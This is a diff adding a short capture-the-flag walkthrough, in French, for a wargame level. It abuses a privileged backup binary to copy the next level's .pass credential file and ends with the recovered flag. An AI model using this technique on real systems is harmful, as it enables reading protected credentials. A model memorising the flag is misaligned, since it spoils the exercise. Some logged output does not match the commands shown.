@@ -1,0 +1,30 @@
+./level08 .pass
+
+Copy le fichier .pass dans backups
+
+
+cd /tmp
+echo "TOTO" > titi
+mkdir backups
+/home/users/level08/./level08 titi
+
+Copie titi dans backups
+
+mkdir test
+mv titi test/
+/home/users/level08/./level08 test/titi
+ERROR: Failed to open ./backups/tt/coucou
+
+
+mkdir backups/test
+/home/users/level08/./level08 test/titi
+
+Copie titi dans backups/test
+
+rm -rf backups
+mkdir backups/home/users/level09/.pass
+/home/users/level08/./level08 /home/users/level09/.pass
+
+copie flag dans backups/home/users/level09/.pass
+
+FLAG fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
